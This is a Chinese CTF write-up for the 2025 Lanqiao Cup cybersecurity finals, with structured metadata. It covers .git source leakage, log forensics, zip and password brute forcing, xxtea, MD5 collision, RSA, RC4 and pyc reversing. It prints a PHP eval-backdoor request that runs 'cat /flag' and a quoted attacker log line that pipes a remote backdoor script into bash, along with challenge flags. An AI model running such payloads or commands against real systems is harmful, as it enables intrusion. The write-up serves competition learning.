---
title: 2025 蓝桥杯网络安全赛道全国总决赛 WriteUp（GitHack 源码泄露 + xxtea + fastcoll MD5 碰撞）
contest: 2025 蓝桥杯网络安全赛道
year: 2025
difficulty: easy
vuln_type:
- web_unknown
- crypto_unknown
- auth_bypass
- sqli
tags:
- 蓝桥杯 2025 网络安全 国赛
- 被遗忘的 GitHack 源码泄露
- loginpass cookie 828193099115dcaa67805a0776785b3a
- action=eval&phpcode=system
- server_logs dnsmasq.log 攻击者 IP 192.168.42.77
- ssh Accepted password attacker
- hidden_backdoor 服务名
- flowzip2 正则 d{3} 爆破三位数字密码
- xxtea 反向解密
- fastcoll MD5 碰撞 gamelab_1.txt
attack_chain:
- '被遗忘的: GitHack 工具下载源码 → 代码审计 xx.php → action=eval&phpcode=system("cat /flag")'
- loginpass=828193099115dcaa67805a0776785b3a cookie 模拟登录
- 'server_logs: dnsmasq.log 第 602 行可疑域名 → IP 192.168.42.77 → ssh 成功日志 attacker'
- hidden_backdoor 后门服务 → flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}
- 'flowzip2: 流量包导出 zip → 注释正则 d{3} 三位数字 → 批量爆破'
- 'xxtea: 反向解密 4eb88a16-be48-4de2-ab2a-ed09a09ed386'
- 'fastcoll: MD5 碰撞生成两个不同文件同 MD5'
key_payload: GitHack 工具下载源码 + action=eval&phpcode=system
one_liner: 2025 蓝桥杯网络安全国赛：GitHack 源码泄露 + ssh attacker IP 溯源 + xxtea 解密 + fastcoll MD5 碰撞。
lesson: 蓝桥杯网络安全赛道是国内官方赛事，难度中等；GitHack / GitTools 是 .git 源码泄露首选工具；fastcoll 工具是 MD5 碰撞最简方案；ssh 日志找 attacker IP 是经典溯源题。
quality: medium
full_path: 2025蓝桥杯网络安全赛道全国总决赛WriteUp.full.md
meta_path: 2025蓝桥杯网络安全赛道全国总决赛WriteUp.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: '2025 蓝桥杯网络安全赛道全国总决赛 WriteUp（GitHack 源码泄露 + xxtea + fastcoll MD5 碰撞）。2025 蓝桥杯网络安全国赛：GitHack 源码泄露 + ssh attacker IP 溯源 + xxtea 解密 + fastcoll MD5 碰撞。。关键路径：被遗忘的: GitHack 工具下载源码 → 代码审计 xx.php → action=e...'
category: web
subcategory: web_other
subcategories:
- web_other
- crypto_other
- logic
- sql_injection
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 1
last_verified: 2026-09-20
contest_type: school
wp_url: https://www.ctfiot.com/267359.html
reasoning_chain:
- '触发点：被遗忘的题目提示 IDE 注释 ''// Fix: Remember to …'' + tools 路径 → 假设：.git 源码泄露 → 动作：GitHack http://target/.git/'
- 下一步：代码审计 xx.php → 假设：action=eval 后门 → 动作：POST /xx.php action=eval&phpcode=system('cat /flag')
- 观察：loginpass=828193099115dcaa67805a0776785b3a cookie 模拟登录 → 下一步：拿 flag
- 触发点：/var/log/dnsmasq.log 第 602 行可疑域名 → 假设：攻击者 IP 痕迹 → 动作：grep 第 602 行提取域名 → IP 192.168.42.77
- 下一步：ssh 日志 'Accepted password for attacker from 192.168.42.77' → 假设：后门脚本名 hidden_backdoor
- 观察：flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}
- 触发点：flowzip2 流量包导出 zip + 注释正则 d{3} → 假设：三位数字密码 → 动作：批量爆破
- 下一步：拿到解压 zip 内容 → flag{5f5491b6-fddf-4be8-ab44-5a18831cc45b}
- 触发点：xxtea 加密 → 假设：xxtea 反向解密 → 动作：还原 → flag{4eb88a16-be48-4de2-ab2a-ed09a09ed386}
- 下一步：MD5 碰撞 fastcoll gamelab_1.txt → out gamelab_2.txt gamelab_3.txt → 找碰撞对
failed_attempts:
- 试图直接 ssh weakpass 登入 → 失败：ssh log 给的是 attacker 已成功过的入口，不是当前密码
- 试图 zip 全部字典爆破 → 失败：注释提示 d{3} 三位数字缩短字典
- 试图手写 MD5 碰撞 → 失败：fastcoll_v1.0.0.5.exe 是最简方案
key_observations:
- GitHack / GitTools 是 .git 源码泄露首选工具
- fastcoll 工具是 MD5 碰撞最简方案（生成两个不同文件同 MD5）
- ssh 日志找 attacker IP 是经典溯源题套路
- dnsmasq.log 可疑域名是 CTF 溯源题常见提示
- action=eval 后门 param phpcode=system('cat /flag') 是 PHP 后门经典
prerequisites:
- GitHack / GitTools 源码泄露工具
- ssh 日志/dnsmasq.log 溯源分析
- xxtea 加解密流程
- fastcoll MD5 碰撞使用
---
# 2025蓝桥杯网络安全赛道全国总决赛WriteUp

> 原文: https://www.ctfiot.com/267359.html
> ID: 267359

2025蓝桥杯网络安全赛道全国总决赛题解

一、情报收集

1、被遗忘的

题目内容：

As the developer rushed to lunch, the IDE remained open on his desk. The cursor blinked beside a half-written comment:

// Fix: Remember to …

题解：气死了，刚拿到源码比赛结束了。 这个题具体就是Git源码泄露，根据题目提示，在tools路径下有提示。访问得到工具“GitHack”可以将源码下载下来。代码审计xx.php文件

POST /xx.php HTTP/1.1
Host: xxxxx.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Cookie: loginpass=828193099115dcaa67805a0776785b3a
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

action=eval&phpcode=system("cat /flag")

构造请求包，即可登录后台拿到flag。

flag：动态

二、数据分析：

1、server_logs

文件名：（server_logs_ac1addb9e67faef5b2105de239e1990f.zip）

题解：var/log/dnsmasq.log中第602行存在可疑的域名，猜测是攻击者使用的域名，其IP地址为：192.168.42.77。对其他文件进行搜索，寻找这个IP地址，不难发现存在了一个ssh登陆成功的日志信息：

Jun 15 02:30:15 server sshd[5678]: Accepted password for attacker from 192.168.42.77 port 1337 Jun 15 02:30:30 server sudo: attacker : TTY=pts/0 ; COMMAND=curl -s http://malicious.site/backdoor.sh | bash

这ID名一看就知道是攻击者，所以前面的猜测是对的，攻击者在成功登录ssh后立刻执行了恶意命令，上传了一个后门脚本。在文件夹里锁定这个脚本，并且在另一个目录成功找到服务名为：hidden_backdoor。解题结束，综上得到flag。

flag：flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}

2、flowzip2

文件名：（flowzip2_fe9d6d2cf5a6fe83f1d7f0fe3c60fa25.zip）

题目内容：There are many encrypted zip files.

题解：流量分析题目，查看流量包发现有好多压缩包，先导出看一看。点看看见压缩包下面有注释，好像是正则表达式d{3}即三位数字，批量爆破一下即可得到flag。

flag：flag{5f5491b6-fddf-4be8-ab44-5a18831cc45b}

三、密码破解：

1、xxtea

文件名：（xxtea_13e418f4e3f3d389f3cee45e90017de4.zip）

题目内容：It’s getting hard to even copy the data this time. flag:
flag{4eb88a16-be48-4de2-ab2a-ed09a09ed386}

题解：根据题目给的步骤反过来解密即可。

flag：flag{4eb88a16-be48-4de2-ab2a-ed09a09ed386}

2、fastcoll

题目内容：这是一个MD5碰撞挑战：你能找到两个不同文件，但却拥有相同的MD5值吗？

题解：文件名就是工具名，即：使用fastcoll工具生成两个文件。 提交即可获取flag。

fastcoll_v1.0.0.5.exe -p gamelab_1.txt -o gamelab_2.txt gamelab_3.txt

flag：动态

3、qppq

文件名：（server.py）

题目内容：Slightly modify the pqqp problem.

题解：基础的RSA题目，脚本：

import gmpy2
from Crypto.Util.number import *

n = 67409525******
e = 2218352136******
ciphertext = [290125******]
param1 = 5200952616******
param2 = 0

phi = n + 1 - param1
d = gmpy2.invert(e, phi)
m = pow(ciphertext[0], d, n)
print(long_to_bytes(m))

flag：flag{33a0958e-35c5-4ba4-8140-42b5005f137e}（动态）

四、逆向分析

1、encodefile

文件名：（encodefile_ac68893d381e146c461008ad7a1fc396.zip）

题目内容：分析一个用于加密明文的可执行程序，通过识别其加密逻辑成功解密生成的密文文件，恢复出原始数据内容。

题解：RC4解密题，IDA查看字符串发现有lqb字样，跳转对应函数找到加密逻辑，RC4模板解密即可。

flag：flag{db6007d2-9b1e-2f98-cef3-6595b63763dd}

2、rand_pyc

文件名：（rand_pyc_obf_b822fc9c41581fc991ee0e2f5fa9173c.zip）

题目内容：对由Python打包生成的exe文件进行逆向处理，提取并还原出其核心源码，以便进一步分析程序逻辑并获得正确的输入。

题解：题目名已给出提示是pyc反编译的题了，直接使用工具反编译即可。使用pyinstxtractor工具反编译为pyc，然后再使用uncompyle6工具将pyc反编译成python文件。

import random
import base64

a = [4417023, 5690625, 9639225, 1327718, 4417023, 5085550, 5752075, 9556690, 5240080, 6431679, 3428007, 3189766, 3438336, 5757818, 3189766, 5690625, 4148389, 2254831, 6292433, 2122126, 5240080, 6431679, 9488271, 2464675, 7216908, 5757818, 3189766, 5690625, 3438336, 6431679, 2360475, 6002055, 5240080, 9040261, 8655414, 9347278, 3438336, 2254831, 2122126, 5135281, 2360475, 9347278, 4417023, 1327718, 3438336, 3448715, 9488271, 5501611, 5240080, 5757818, 9488271, 5501611, 5240080, 9347278, 4148389, 1714134, 9923116, 4267438, 4263793, 5752075, 2464675, 7777627, 6002055, 3485900]

enc = {}
for i in range(128):
    random.seed(i)
    enc[random.randint(1000000, 9999999)] = chr(i)

res = ''.join([enc[num] for num in a])[:-8]
print(base64.b64decode(res).decode())

# flag{30de99f4-50d2-9f8f-2868-dcfa9d81483c}

flag：flag{30de99f4-50d2-9f8f-2868-dcfa9d81483c}

五、漏洞挖掘分析

1、弱口令

题解：打开链接，登录页面有一个测试账号密码，登陆进去之后发现提示：用户存在弱口令习惯，习惯为用户名+四位数字。使用字典生成器生成用户名为admin的密码：admin+四位数字，抓包后使用该字典爆破密码，最后得到密码为admin0621。登录成功即可拿到flag。

开始抓包查看提示，竟然还有误导的提示，说是可能会有越权漏洞。我还以为是jwt伪造呢，浪费我好长时间。。。。。。

flag：动态

【更多题解】：

2025御网杯【本科组】线下半决赛CTF+总决赛应急响应综合渗透WriteUp

第九届御网杯网络安全大赛校级选拔赛题解

2024 第八届强网杯青少年专项赛 writeup

2024信阳师范大学CTF新生赛官方题解


```
POST /xx.php HTTP/1.1
Host: xxxxx.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Cookie: loginpass=828193099115dcaa67805a0776785b3a
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

action=eval&phpcode=system("cat /flag")
fastcoll_v1.0.0.5.exe -p gamelab_1.txt -o gamelab_2.txt gamelab_3.txt
import gmpy2
from Crypto.Util.number import *

n = 67409525******
e = 2218352136******
ciphertext = [290125******]
param1 = 5200952616******
param2 = 0

phi = n + 1 - param1
d = gmpy2.invert(e, phi)
m = pow(ciphertext[0], d, n)
print(long_to_bytes(m))
import random
import base64

a = [4417023, 5690625, 9639225, 1327718, 4417023, 5085550, 5752075, 9556690, 5240080, 6431679, 3428007, 3189766, 3438336, 5757818, 3189766, 5690625, 4148389, 2254831, 6292433, 2122126, 5240080, 6431679, 9488271, 2464675, 7216908, 5757818, 3189766, 5690625, 3438336, 6431679, 2360475, 6002055, 5240080, 9040261, 8655414, 9347278, 3438336, 2254831, 2122126, 5135281, 2360475, 9347278, 4417023, 1327718, 3438336, 3448715, 9488271, 5501611, 5240080, 5757818, 9488271, 5501611, 5240080, 9347278, 4148389, 1714134, 9923116, 4267438, 4263793, 5752075, 2464675, 7777627, 6002055, 3485900]

enc = {}
for i in range(128):
    random.seed(i)
    enc[random.randint(1000000, 9999999)] = chr(i)

res = ''.join([enc[num] for num in a])[:-8]
print(base64.b64decode(res).decode())

# flag{30de99f4-50d2-9f8f-2868-dcfa9d81483c}
```


---
## 附图

[图片已移除]